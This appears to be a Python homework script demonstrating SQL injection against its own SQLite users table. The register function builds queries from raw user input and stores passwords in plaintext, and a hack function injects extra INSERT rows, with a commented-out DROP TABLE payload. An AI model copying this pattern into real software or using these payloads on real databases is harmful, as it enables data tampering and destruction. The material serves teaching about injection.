import random
import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect("../homework.db") as conn:
        cursor = conn.cursor()
        cursor.executescript(
            f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        )
        conn.commit()


def hack() -> None:
    # удаление таблицы
    # username: str = "', 'any'); DROP TABLE table_users; --"
    # Добавление произвольных записей
    username: str = ("', 'any'); "
                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}');"
                     f"INSERT INTO table_users (username, password) VALUES ('{random.randint(1, 10101010)}', '{random.randint(1, 10101010)}'); --")
    password: str = "any"
    register(username, password)


if __name__ == "__main__":
    register("wignorbo", "sjkadnkjasdnui31jkdwq")
    hack()
